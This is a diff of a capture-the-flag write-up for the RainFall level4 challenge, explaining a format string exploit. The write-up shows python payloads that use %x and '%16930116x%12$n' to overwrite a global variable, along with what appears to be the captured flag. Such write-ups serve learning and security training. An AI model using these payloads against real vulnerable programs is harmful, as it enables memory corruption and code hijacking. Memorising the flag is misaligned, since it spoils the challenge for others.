@@ -76,11 +76,7 @@ Dump of assembler code for function p:
    0x08048455 <+17>:	leave  
    0x08048456 <+18>:	ret    
 End of assembler dump.
-
-
-
 ```
-
 
 It seems to be another format string attack, but more complicated.
 
@@ -110,12 +106,9 @@ void n(void)
 
 So we must edit m again, but the address if kind big this time, we will need a big script for that.
 
-We guess that we have to use the p function to make the attack.
+So we are basically going to use the same script as before, but using a more longer buffer.
 
-So we are basically going to use the same script as before, but way more heavy.
-
-
-the 'm' adresses is the following : 0x8049810 lets push it to the stack and point to it using %x.
+The 'm' adress is the following : 0x8049810 lets push it to the stack and point to it using %x.
 
 ```sh
 level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x'" | ./level4
@@ -142,19 +135,21 @@ Now we must write enough character to write 0x1025544 into m, which is 16930116 
 
 After some documentation, we can use '%16930116x' to write 16930116 in STDIN.
 
-
 python -c "print '\x10\x98\x04\x08' + '%16930116x' + '%12\$n'" | ./level4
 
 So here's what i changed, we still push our memory to the stack, this time instead of printing 11 %x, im using '%12$n' to direcly jump to the index of the pointer, which save us byte to substrace to the input.
 
-
-Since we already wrote 4byte, we are going to substract 16930116 - 4 = 16930112.
+Since we already wrote 4 byte, we are going to substract 16930116 - 4 = 16930112.
 
 And then we try
 
-```sh                                                                                                                                                                                                                              (...)                                                                                                                                                                                                                                                                                                                                          b7ff26b0
+```sh
+(...)
+(...)
+(...)
+(...)
+(...)
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-
 ```
 
-A lot of bytes got wrote to stdin, but then the %n took this length and wrote it to our addresses, and entered the if which gaved us the flag.
+A lot of bytes got wrote to stdin, but then the %n took this length and wrote it to our address, which triggered the if and print our flag.
